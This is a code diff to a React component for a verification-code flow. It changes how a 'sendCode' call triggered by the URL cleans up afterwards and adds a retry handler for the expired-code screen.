@@ -43,11 +43,10 @@ export default function Home() {
     if (!action || !id) { setStep("form"); return; }
 
     base44.functions.invoke("sendCode", { submissionId: id, action })
-      .then(() => {})
-      .catch(() => {});
-    // Clean URL and show blank form (user's page stays on their own device)
-    window.history.replaceState({}, "", "/");
-    setStep("form");
+      .catch(() => {})
+      .finally(() => {
+        window.history.replaceState({}, "", "/");
+      });
   }, []);
 
   // Poll every 3s when on "validation" step (waiting for code_ready)
@@ -110,6 +109,10 @@ export default function Home() {
     window.location.href = "/";
   };
 
+  const handleRetryCode = () => {
+    setStep("code");
+  };
+
   return (
     <div className="min-h-screen bg-background relative overflow-hidden flex items-center justify-center px-4 py-12">
       <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[600px] h-[600px] bg-primary/10 rounded-full blur-[120px] pointer-events-none" />
@@ -122,7 +125,7 @@ export default function Home() {
         {step === "waiting"    && <CodeWaiting />}
         {step === "verified"   && <VerificationSuccess data={submittedData} />}
         {step === "wrong"      && <ResultScreen type="wrong" onBack={handleBack} />}
-        {step === "expired"    && <ResultScreen type="expired" onBack={handleBack} />}
+        {step === "expired"    && <ResultScreen type="expired" onBack={handleRetryCode} />}
       </div>
     </div>
   );
